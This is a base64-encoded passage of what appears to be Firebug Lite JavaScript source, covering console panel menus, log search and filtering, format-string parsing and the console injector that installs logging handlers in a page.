CkNCiAgICB7DQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICBvcHRpb25NZW51KCJTaG93SmF2YVNjcmlwdEVycm9ycyIsICJzaG93SlNFcnJvcnMiKSwNCiAgICAgICAgICAgIG9wdGlvbk1lbnUoIlNob3dKYXZhU2NyaXB0V2FybmluZ3MiLCAic2hvd0pTV2FybmluZ3MiKSwNCiAgICAgICAgICAgIG9wdGlvbk1lbnUoIlNob3dDU1NFcnJvcnMiLCAic2hvd0NTU0Vycm9ycyIpLA0KICAgICAgICAgICAgb3B0aW9uTWVudSgiU2hvd1hNTEVycm9ycyIsICJzaG93WE1MRXJyb3JzIiksDQogICAgICAgICAgICBvcHRpb25NZW51KCJTaG93WE1MSHR0cFJlcXVlc3RzIiwgInNob3dYTUxIdHRwUmVxdWVzdHMiKSwNCiAgICAgICAgICAgIG9wdGlvbk1lbnUoIlNob3dDaHJvbWVFcnJvcnMiLCAic2hvd0Nocm9tZUVycm9ycyIpLA0KICAgICAgICAgICAgb3B0aW9uTWVudSgiU2hvd0Nocm9tZU1lc3NhZ2VzIiwgInNob3dDaHJvbWVNZXNzYWdlcyIpLA0KICAgICAgICAgICAgb3B0aW9uTWVudSgiU2hvd0V4dGVybmFsRXJyb3JzIiwgInNob3dFeHRlcm5hbEVycm9ycyIpLA0KICAgICAgICAgICAgb3B0aW9uTWVudSgiU2hvd05ldHdvcmtFcnJvcnMiLCAic2hvd05ldHdvcmtFcnJvcnMiKSwNCiAgICAgICAgICAgIHRoaXMuZ2V0U2hvd1N0YWNrVHJhY2VNZW51SXRlbSgpLA0KICAgICAgICAgICAgdGhpcy5nZXRTdHJpY3RPcHRpb25NZW51SXRlbSgpLA0KICAgICAgICAgICAgIi0iLA0KICAgICAgICAgICAgb3B0aW9uTWVudSgiTGFyZ2VDb21tYW5kTGluZSIsICJsYXJnZUNvbW1hbmRMaW5lIikNCiAgICAgICAgXTsNCiAgICB9LA0KDQogICAgZ2V0U2hvd1N0YWNrVHJhY2VNZW51SXRlbTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIG1lbnVJdGVtID0gc2VydmljZU9wdGlvbk1lbnUoIlNob3dTdGFja1RyYWNlIiwgInNob3dTdGFja1RyYWNlIik7DQogICAgICAgIGlmIChGaXJlYnVnQ29udGV4dCAmJiAhRmlyZWJ1Zy5EZWJ1Z2dlci5pc0Fsd2F5c0VuYWJsZWQoKSkNCiAgICAgICAgICAgIG1lbnVJdGVtLmRpc2FibGVkID0gdHJ1ZTsNCiAgICAgICAgcmV0dXJuIG1lbnVJdGVtOw0KICAgIH0sDQoNCiAgICBnZXRTdHJpY3RPcHRpb25NZW51SXRlbTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHN0cmljdERvbWFpbiA9ICJqYXZhc2NyaXB0Lm9wdGlvbnMiOw0KICAgICAgICB2YXIgc3RyaWN0TmFtZSA9ICJzdHJpY3QiOw0KICAgICAgICB2YXIgc3RyaWN0VmFsdWUgPSBwcmVmcy5nZXRCb29sUHJlZihzdHJpY3REb21haW4rIi4iK3N0cmljdE5hbWUpOw0KICAgICAgICByZXR1cm4ge2xhYmVsOiAiSmF2YXNjcmlwdE9wdGlvbnNTdHJpY3QiLCB0eXBlOiAiY2hlY2tib3giLCBjaGVja2VkOiBzdHJpY3RWYWx1ZSwNCiAgICAgICAgICAgIGNvbW1hbmQ6IGJpbmRGaXhlZChGaXJlYnVnLnNldFByZWYsIEZpcmVidWcsIHN0cmljdERvbWFpbiwgc3RyaWN0TmFtZSwgIXN0cmljdFZhbHVlKSB9Ow0KICAgIH0sDQoNCiAgICBnZXRCcmVha09uTWVudUl0ZW1zOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvL3h4eEhvbnphOiBubyBCT04gb3B0aW9ucyBmb3Igbm93Lg0KICAgICAgICAvKnJldHVybiBbDQogICAgICAgICAgICBvcHRpb25NZW51KCJjb25zb2xlLm9wdGlvbi5QZXJzaXN0IEJyZWFrIE9uIEVycm9yIiwgInBlcnNpc3RCcmVha09uRXJyb3IiKQ0KICAgICAgICBdOyovDQogICAgICAgcmV0dXJuIFtdOw0KICAgIH0sDQoNCiAgICBzZWFyY2g6IGZ1bmN0aW9uKHRleHQpDQogICAgew0KICAgICAgICBpZiAoIXRleHQpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgLy8gTWFrZSBwcmV2aW91c2x5IHZpc2libGUgbm9kZXMgaW52aXNpYmxlIGFnYWluDQogICAgICAgIGlmICh0aGlzLm1hdGNoU2V0KQ0KICAgICAgICB7DQogICAgICAgICAgICBmb3IgKHZhciBpIGluIHRoaXMubWF0Y2hTZXQpDQogICAgICAgICAgICAgICAgcmVtb3ZlQ2xhc3ModGhpcy5tYXRjaFNldFtpXSwgIm1hdGNoZWQiKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHRoaXMubWF0Y2hTZXQgPSBbXTsNCg0KICAgICAgICBmdW5jdGlvbiBmaW5kUm93KG5vZGUpIHsgcmV0dXJuIGdldEFuY2VzdG9yQnlDbGFzcyhub2RlLCAibG9nUm93Iik7IH0NCiAgICAgICAgdmFyIHNlYXJjaCA9IG5ldyBUZXh0U2VhcmNoKHRoaXMucGFuZWxOb2RlLCBmaW5kUm93KTsNCg0KICAgICAgICB2YXIgbG9nUm93ID0gc2VhcmNoLmZpbmQodGV4dCk7DQogICAgICAgIGlmICghbG9nUm93KQ0KICAgICAgICB7DQogICAgICAgICAgICBkaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25Db25zb2xlU2VhcmNoTWF0Y2hGb3VuZCcsIFt0aGlzLCB0ZXh0LCBbXV0pOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGZvciAoOyBsb2dSb3c7IGxvZ1JvdyA9IHNlYXJjaC5maW5kTmV4dCgpKQ0KICAgICAgICB7DQogICAgICAgICAgICBzZXRDbGFzcyhsb2dSb3csICJtYXRjaGVkIik7DQogICAgICAgICAgICB0aGlzLm1hdGNoU2V0LnB1c2gobG9nUm93KTsNCiAgICAgICAgfQ0KICAgICAgICBkaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25Db25zb2xlU2VhcmNoTWF0Y2hGb3VuZCcsIFt0aGlzLCB0ZXh0LCB0aGlzLm1hdGNoU2V0XSk7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICBicmVha09uTmV4dDogZnVuY3Rpb24oYnJlYWtpbmcpDQogICAgew0KICAgICAgICBGaXJlYnVnLnNldFByZWYoRmlyZWJ1Zy5zZXJ2aWNlUHJlZkRvbWFpbiwgImJyZWFrT25FcnJvcnMiLCBicmVha2luZyk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBwcml2YXRlDQoNCiAgICBjcmVhdGVSb3c6IGZ1bmN0aW9uKHJvd05hbWUsIGNsYXNzTmFtZSkNCiAgICB7DQogICAgICAgIHZhciBlbHQgPSB0aGlzLmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOw0KICAgICAgICBlbHQuY2xhc3NOYW1lID0gcm93TmFtZSArIChjbGFzc05hbWUgPyAiICIgKyByb3dOYW1lICsgIi0iICsgY2xhc3NOYW1lIDogIiIpOw0KICAgICAgICByZXR1cm4gZWx0Ow0KICAgIH0sDQoNCiAgICBnZXRUb3BDb250YWluZXI6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmICh0aGlzLmdyb3VwcyAmJiB0aGlzLmdyb3Vwcy5sZW5ndGgpDQogICAgICAgICAgICByZXR1cm4gdGhpcy5ncm91cHNbdGhpcy5ncm91cHMubGVuZ3RoLTFdOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICByZXR1cm4gdGhpcy5wYW5lbE5vZGU7DQogICAgfSwNCg0KICAgIGZpbHRlckxvZ1JvdzogZnVuY3Rpb24obG9nUm93LCBzY3JvbGxlZFRvQm90dG9tKQ0KICAgIHsNCiAgICAgICAgaWYgKHRoaXMuc2VhcmNoVGV4dCkNCiAgICAgICAgew0KICAgICAgICAgICAgc2V0Q2xhc3MobG9nUm93LCAibWF0Y2hpbmciKTsNCiAgICAgICAgICAgIHNldENsYXNzKGxvZ1JvdywgIm1hdGNoZWQiKTsNCg0KICAgICAgICAgICAgLy8gU2VhcmNoIGFmdGVyIGEgZGVsYXkgYmVjYXVzZSB3ZSBtdXN0IHdhaXQgZm9yIGEgZnJhbWUgdG8gYmUgY3JlYXRlZCBmb3INCiAgICAgICAgICAgIC8vIHRoZSBuZXcgbG9nUm93IHNvIHRoYXQgdGhlIGZpbmRlciB3aWxsIGJlIGFibGUgdG8gbG9jYXRlIGl0DQogICAgICAgICAgICBzZXRUaW1lb3V0KGJpbmRGaXhlZChmdW5jdGlvbigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHRoaXMuc2VhcmNoRmlsdGVyKHRoaXMuc2VhcmNoVGV4dCwgbG9nUm93KSkNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5tYXRjaFNldC5wdXNoKGxvZ1Jvdyk7DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICByZW1vdmVDbGFzcyhsb2dSb3csICJtYXRjaGVkIik7DQoNCiAgICAgICAgICAgICAgICByZW1vdmVDbGFzcyhsb2dSb3csICJtYXRjaGluZyIpOw0KDQogICAgICAgICAgICAgICAgaWYgKHNjcm9sbGVkVG9Cb3R0b20pDQogICAgICAgICAgICAgICAgICAgIHNjcm9sbFRvQm90dG9tKHRoaXMucGFuZWxOb2RlKTsNCiAgICAgICAgICAgIH0sIHRoaXMpLCAxMDApOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIHNlYXJjaEZpbHRlcjogZnVuY3Rpb24odGV4dCwgbG9nUm93KQ0KICAgIHsNCiAgICAgICAgdmFyIGNvdW50ID0gdGhpcy5wYW5lbE5vZGUuY2hpbGROb2Rlcy5sZW5ndGg7DQogICAgICAgIHZhciBzZWFyY2hSYW5nZSA9IHRoaXMuZG9jdW1lbnQuY3JlYXRlUmFuZ2UoKTsNCiAgICAgICAgc2VhcmNoUmFuZ2Uuc2V0U3RhcnQodGhpcy5wYW5lbE5vZGUsIDApOw0KICAgICAgICBzZWFyY2hSYW5nZS5zZXRFbmQodGhpcy5wYW5lbE5vZGUsIGNvdW50KTsNCg0KICAgICAgICB2YXIgc3RhcnRQdCA9IHRoaXMuZG9jdW1lbnQuY3JlYXRlUmFuZ2UoKTsNCiAgICAgICAgc3RhcnRQdC5zZXRTdGFydEJlZm9yZShsb2dSb3cpOw0KDQogICAgICAgIHZhciBlbmRQdCA9IHRoaXMuZG9jdW1lbnQuY3JlYXRlUmFuZ2UoKTsNCiAgICAgICAgZW5kUHQuc2V0U3RhcnRBZnRlcihsb2dSb3cpOw0KDQogICAgICAgIHJldHVybiBmaW5kZXIuRmluZCh0ZXh0LCBzZWFyY2hSYW5nZSwgc3RhcnRQdCwgZW5kUHQpICE9IG51bGw7DQogICAgfSwNCg0KICAgIC8vIG5zSVByZWZPYnNlcnZlcg0KICAgIG9ic2VydmU6IGZ1bmN0aW9uKHN1YmplY3QsIHRvcGljLCBkYXRhKQ0KICAgIHsNCiAgICAgICAgLy8gV2UncmUgb2JzZXJ2aW5nIHByZWZlcmVuY2VzIG9ubHkuDQogICAgICAgIGlmICh0b3BpYyAhPSAibnNQcmVmOmNoYW5nZWQiKQ0KICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICAvLyB4eHhIb256YSBjaGVjayB0aGlzIG91dC4NCiAgICAgICAgdmFyIHByZWZEb21haW4gPSAiRmlyZWJ1Zy5leHRlbnNpb24uIjsNCiAgICAgICAgdmFyIHByZWZOYW1lID0gZGF0YS5zdWJzdHIocHJlZkRvbWFpbi5sZW5ndGgpOw0KICAgICAgICBpZiAocHJlZk5hbWUgPT0gImNvbnNvbGUubG9nTGltaXQiKQ0KICAgICAgICAgICAgdGhpcy51cGRhdGVNYXhMaW1pdCgpOw0KICAgIH0sDQoNCiAgICB1cGRhdGVNYXhMaW1pdDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHZhbHVlID0gMTAwMDsNCiAgICAgICAgLy9UT0RPOiB4eHhwZWRybyBwcmVmZXJlbmNlcyBsb2cgbGltaXQ/DQogICAgICAgIC8vdmFyIHZhbHVlID0gRmlyZWJ1Zy5nZXRQcmVmKEZpcmVidWcucHJlZkRvbWFpbiwgImNvbnNvbGUubG9nTGltaXQiKTsNCiAgICAgICAgbWF4UXVldWVSZXF1ZXN0cyA9ICB2YWx1ZSA/IHZhbHVlIDogbWF4UXVldWVSZXF1ZXN0czsNCiAgICB9LA0KDQogICAgc2hvd0NvbW1hbmRMaW5lOiBmdW5jdGlvbihzaG91bGRTaG93KQ0KICAgIHsNCiAgICAgICAgLy9UT0RPOiB4eHhwZWRybyBzaG93IGNvbW1hbmQgbGluZSBpbXBvcnRhbnQNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgaWYgKHNob3VsZFNob3cpDQogICAgICAgIHsNCiAgICAgICAgICAgIGNvbGxhcHNlKEZpcmVidWcuY2hyb21lLiQoImZiQ29tbWFuZEJveCIpLCBmYWxzZSk7DQogICAgICAgICAgICBGaXJlYnVnLkNvbW1hbmRMaW5lLnNldE11bHRpTGluZShGaXJlYnVnLmxhcmdlQ29tbWFuZExpbmUsIEZpcmVidWcuY2hyb21lKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIE1ha2Ugc3VyZSB0aGF0IGVudGlyZSBjb250ZW50IG9mIHRoZSBDb25zb2xlIHBhbmVsIGlzIGhpZGRlbiB3aGVuDQogICAgICAgICAgICAvLyB0aGUgcGFuZWwgaXMgZGlzYWJsZWQuDQogICAgICAgICAgICBGaXJlYnVnLkNvbW1hbmRMaW5lLnNldE11bHRpTGluZShmYWxzZSwgRmlyZWJ1Zy5jaHJvbWUsIEZpcmVidWcubGFyZ2VDb21tYW5kTGluZSk7DQogICAgICAgICAgICBjb2xsYXBzZShGaXJlYnVnLmNocm9tZS4kKCJmYkNvbW1hbmRCb3giKSwgdHJ1ZSk7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgb25TY3JvbGw6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgLy8gVXBkYXRlIHRoZSBzY3JvbGwgcG9zaXRpb24gZmxhZyBpZiB0aGUgcG9zaXRpb24gY2hhbmdlcy4NCiAgICAgICAgdGhpcy53YXNTY3JvbGxlZFRvQm90dG9tID0gRkJMLmlzU2Nyb2xsZWRUb0JvdHRvbSh0aGlzLnBhbmVsTm9kZSk7DQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY29uc29sZS5vblNjcm9sbCAtLS0tLS0tLS0tLS0tLS0tLS0gd2FzU2Nyb2xsZWRUb0JvdHRvbTogIiArDQogICAgICAgICAgICAgICAgdGhpcy53YXNTY3JvbGxlZFRvQm90dG9tICsgIiwgd2FzU2Nyb2xsZWRUb0JvdHRvbTogIiArDQogICAgICAgICAgICAgICAgdGhpcy5jb250ZXh0LmdldE5hbWUoKSwgZXZlbnQpOw0KICAgIH0sDQoNCiAgICBvblJlc2l6ZTogZnVuY3Rpb24oZXZlbnQpDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJjb25zb2xlLm9uUmVzaXplIC0tLS0tLS0tLS0tLS0tLS0tLSB3YXNTY3JvbGxlZFRvQm90dG9tOiAiICsNCiAgICAgICAgICAgICAgICB0aGlzLndhc1Njcm9sbGVkVG9Cb3R0b20gKyAiLCBvZmZzZXRIZWlnaHQ6ICIgKyB0aGlzLnBhbmVsTm9kZS5vZmZzZXRIZWlnaHQgKw0KICAgICAgICAgICAgICAgICIsIHNjcm9sbFRvcDogIiArIHRoaXMucGFuZWxOb2RlLnNjcm9sbFRvcCArICIsIHNjcm9sbEhlaWdodDogIiArDQogICAgICAgICAgICAgICAgdGhpcy5wYW5lbE5vZGUuc2Nyb2xsSGVpZ2h0ICsgIiwgIiArIHRoaXMuY29udGV4dC5nZXROYW1lKCksIGV2ZW50KTsNCg0KICAgICAgICBpZiAodGhpcy53YXNTY3JvbGxlZFRvQm90dG9tKQ0KICAgICAgICAgICAgc2Nyb2xsVG9Cb3R0b20odGhpcy5wYW5lbE5vZGUpOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KZnVuY3Rpb24gcGFyc2VGb3JtYXQoZm9ybWF0KQ0Kew0KICAgIHZhciBwYXJ0cyA9IFtdOw0KICAgIGlmIChmb3JtYXQubGVuZ3RoIDw9IDApDQogICAgICAgIHJldHVybiBwYXJ0czsNCg0KICAgIHZhciByZWcgPSAvKCheJXwuJSkoXGQrKT8oXC4pKFthLXpBLVpdKSl8KCheJXwuJSkoW2EtekEtWl0pKS87DQogICAgZm9yICh2YXIgbSA9IHJlZy5leGVjKGZvcm1hdCk7IG07IG0gPSByZWcuZXhlYyhmb3JtYXQpKQ0KICAgIHsNCiAgICAgICAgaWYgKG1bMF0uc3Vic3RyKDAsIDIpID09ICIlJSIpDQogICAgICAgIHsNCiAgICAgICAgICAgIHBhcnRzLnB1c2goZm9ybWF0LnN1YnN0cigwLCBtLmluZGV4KSk7DQogICAgICAgICAgICBwYXJ0cy5wdXNoKG1bMF0uc3Vic3RyKDEpKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciB0eXBlID0gbVs4XSA/IG1bOF0gOiBtWzVdOw0KICAgICAgICAgICAgdmFyIHByZWNpc2lvbiA9IG1bM10gPyBwYXJzZUludChtWzNdKSA6IChtWzRdID09ICIuIiA/IC0xIDogMCk7DQoNCiAgICAgICAgICAgIHZhciByZXAgPSBudWxsOw0KICAgICAgICAgICAgc3dpdGNoICh0eXBlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNhc2UgInMiOg0KICAgICAgICAgICAgICAgICAgICByZXAgPSBGaXJlYnVnUmVwcy5UZXh0Ow0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICBjYXNlICJmIjoNCiAgICAgICAgICAgICAgICBjYXNlICJpIjoNCiAgICAgICAgICAgICAgICBjYXNlICJkIjoNCiAgICAgICAgICAgICAgICAgICAgcmVwID0gRmlyZWJ1Z1JlcHMuTnVtYmVyOw0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICBjYXNlICJvIjoNCiAgICAgICAgICAgICAgICAgICAgcmVwID0gbnVsbDsNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHBhcnRzLnB1c2goZm9ybWF0LnN1YnN0cigwLCBtWzBdWzBdID09ICIlIiA/IG0uaW5kZXggOiBtLmluZGV4KzEpKTsNCiAgICAgICAgICAgIHBhcnRzLnB1c2goe3JlcDogcmVwLCBwcmVjaXNpb246IHByZWNpc2lvbiwgdHlwZTogKCIlIiArIHR5cGUpfSk7DQogICAgICAgIH0NCg0KICAgICAgICBmb3JtYXQgPSBmb3JtYXQuc3Vic3RyKG0uaW5kZXgrbVswXS5sZW5ndGgpOw0KICAgIH0NCg0KICAgIHBhcnRzLnB1c2goZm9ybWF0KTsNCiAgICByZXR1cm4gcGFydHM7DQp9DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp2YXIgYXBwZW5kT2JqZWN0ID0gRmlyZWJ1Zy5Db25zb2xlUGFuZWwucHJvdG90eXBlLmFwcGVuZE9iamVjdDsNCnZhciBhcHBlbmRGb3JtYXR0ZWQgPSBGaXJlYnVnLkNvbnNvbGVQYW5lbC5wcm90b3R5cGUuYXBwZW5kRm9ybWF0dGVkOw0KdmFyIGFwcGVuZE9wZW5Hcm91cCA9IEZpcmVidWcuQ29uc29sZVBhbmVsLnByb3RvdHlwZS5hcHBlbmRPcGVuR3JvdXA7DQp2YXIgYXBwZW5kQ2xvc2VHcm91cCA9IEZpcmVidWcuQ29uc29sZVBhbmVsLnByb3RvdHlwZS5hcHBlbmRDbG9zZUdyb3VwOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy9GaXJlYnVnLnJlZ2lzdGVyQWN0aXZhYmxlTW9kdWxlKEZpcmVidWcuQ29uc29sZSk7DQpGaXJlYnVnLnJlZ2lzdGVyTW9kdWxlKEZpcmVidWcuQ29uc29sZSk7DQpGaXJlYnVnLnJlZ2lzdGVyUGFuZWwoRmlyZWJ1Zy5Db25zb2xlUGFuZWwpOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQ29uc3RhbnRzDQoNCi8vY29uc3QgQ2MgPSBDb21wb25lbnRzLmNsYXNzZXM7DQovL2NvbnN0IENpID0gQ29tcG9uZW50cy5pbnRlcmZhY2VzOw0KICAgIA0KdmFyIGZyYW1lQ291bnRlcnMgPSB7fTsNCnZhciB0cmFjZVJlY3Vyc2lvbiA9IDA7DQoNCkZpcmVidWcuQ29uc29sZS5pbmplY3RvciA9DQp7DQogICAgaW5zdGFsbDogZnVuY3Rpb24oY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciB3aW4gPSBjb250ZXh0LndpbmRvdzsNCiAgICAgICAgDQogICAgICAgIHZhciBjb25zb2xlSGFuZGxlciA9IG5ldyBGaXJlYnVnQ29uc29sZUhhbmRsZXIoY29udGV4dCwgd2luKTsNCiAgICAgICAgDQogICAgICAgIHZhciBwcm9wZXJ0aWVzID0gDQogICAgICAgIFsNCiAgICAgICAgICAgICJsb2ciLA0KICAgICAgICAgICAgImRlYnVnIiwNCiAgICAgICAgICAgICJpbmZvIiwNCiAgICAgICAgICAgICJ3YXJuIiwNCiAgICAgICAgICAgICJlcnJvciIsDQogICAgICAgICAgICAiYXNzZXJ0IiwNCiAgICAgICAgICAgICJkaXIiLA0KICAgICAgICAgICAgImRpcnhtbCIsDQogICAgICAgICAgICAiZ3JvdXAiLA0KICAgICAgICAgICAgImdyb3VwQ29sbGFwc2VkIiwNCiAgICAgICAgICAgICJncm91cEVuZCIsDQogICAgICAgICAgICAidGltZSIsDQogICAgICAgICAgICAidGltZUVuZCIsDQogICAgICAgICAgICAiY291bnQiLA0KICAgICAgICAgICAgInRyYWNlIiwNCiAgICAgICAgICAgICJwcm9maWxlIiwNCiAgICAgICAgICAgICJwcm9maWxlRW5kIiwNCiAgICAgICAgICAgICJjbGVhciIsDQogICAgICAgICAgICAib3BlbiIsDQogICAgICAgICAgICAiY2xvc2UiDQogICAgICAgIF07DQogICAgICAgIA0KICAgICAgICB2YXIgSGFuZGxlciA9IGZ1bmN0aW9uKG5hbWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBjID0gY29uc29sZUhhbmRsZXI7DQogICAgICAgICAgICB2YXIgZiA9IGNvbnNvbGVIYW5kbGVyW25hbWVdOw0KICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKCl7cmV0dXJuIGYuYXBwbHkoYyxhcmd1bWVudHMpO307DQogICAgICAgIH07DQogICAgICAgIA0KICAgICAgICB2YXIgaW5zdGFsbGVyID0gZnVuY3Rpb24oYykNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgaT0wLCBsPXByb3BlcnRpZXMubGVuZ3RoOyBpPGw7IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgbmFtZSA9IHByb3BlcnRpZXNbaV07DQogICAgICAgICAgICAgICAgY1tuYW1lXSA9IG5ldyBIYW5kbGVyKG5hbWUpOw0KICAgICAgICAgICAgICAgIGMuZmlyZWJ1Z2xpdGUgPSBGaXJlYnVnLnZlcnNpb247DQogICAgICAgICAgICB9DQogICAgICAgIH07DQogICAgICAgIA0KICAgICAgICB2YXIgc2FuZGJveDsNCiAgICAgICAgDQogICAgICAgIGlmICh3aW4uY29uc29sZSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKEVudi5PcHRpb25zLm92ZXJyaWRlQ29uc29sZSkNCiAgICAgICAgICAgICAgICBzYW5kYm94ID0gbmV3IHdpbi5GdW5jdGlvbigiYXJndW1lbnRzLmNhbGxlZS5pbnN0YWxsKHdpbmRvdy5jb25zb2xlPXt9KSIpOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIC8vIGlmIHRoZXJlJ3MgYSBjb25zb2xlIG9iamVjdCBhbmQgb3ZlcnJpZGVDb25zb2xlIGlzIGZhbHNlIHdlIHNob3VsZCBqdXN0IHF1aXQNCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyB0cnkgb3ZlcnJpZGluZyB0aGUgY29uc29sZSBvYmplY3QNCiAgICAgICAgICAgICAgICBzYW5kYm94ID0gbmV3IHdpbi5GdW5jdGlvbigiYXJndW1lbnRzLmNhbGxlZS5pbnN0YWxsKHdpbmRvdy5jb25zb2xlPXt9KSIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2goRSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBpZiBzb21ldGhpbmcgZ29lcyB3cm9uZyBjcmVhdGUgdGhlIGZpcmVidWcgb2JqZWN0IGluc3RlYWQNCiAgICAgICAgICAgICAgICBzYW5kYm94ID0gbmV3IHdpbi5GdW5jdGlvbigiYXJndW1lbnRzLmNhbGxlZS5pbnN0YWxsKHdpbmRvdy5maXJlYnVnPXt9KSIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBzYW5kYm94Lmluc3RhbGwgPSBpbnN0YWxsZXI7DQogICAgICAgIHNhbmRib3goKTsNCiAgICB9LA0KICAgIA0KICAgIGlzQXR0YWNoZWQ6IGZ1bmN0aW9uKGNvbnRleHQsIHdpbikNCiAgICB7DQogICAgICAgIGlmICh3aW4ud3JhcHBlZEpTT2JqZWN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgYXR0YWNoZWQgPSAod2luLndyYXBwZWRKU09iamVjdC5fZ2V0RmlyZWJ1Z0NvbnNvbGVFbGVtZW50ID8gdHJ1ZSA6IGZhbHNlKTsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJDb25zb2xlLmlzQXR0YWNoZWQ6IithdHRhY2hlZCsiIHRvIHdpbi53cmFwcGVkSlNPYmplY3QgIitzYWZlR2V0V2luZG93TG9jYXRpb24od2luLndyYXBwZWRKU09iamVjdCkpOw0KDQogICAgICAgICAgICByZXR1cm4gYXR0YWNoZWQ7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiQ29uc29sZS5pc0F0dGFjaGVkPyB0byB3aW4gIit3aW4ubG9jYXRpb24rIiBmbmM6Iit3aW4uX2dldEZpcmVidWdDb25zb2xlRWxlbWVudCk7DQogICAgICAgICAgICByZXR1cm4gKHdpbi5fZ2V0RmlyZWJ1Z0NvbnNvbGVFbGVtZW50ID8gdHJ1ZSA6IGZhbHNlKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBhdHRhY2hJZk5lZWRlZDogZnVuY3Rpb24oY29udGV4dCwgd2luKQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiQ29uc29sZS5hdHRhY2hJZk5lZWRlZCBoYXMgd2luICIrKHdpbj8gKCh3aW4ud3JhcHBlZEpTT2JqZWN0PyJZRVMiOiJOTyIpKyIgd3JhcHBlZEpTT2JqZWN0Iik6Im51bGwiKSApOw0KDQogICAgICAgIGlmICh0aGlzLm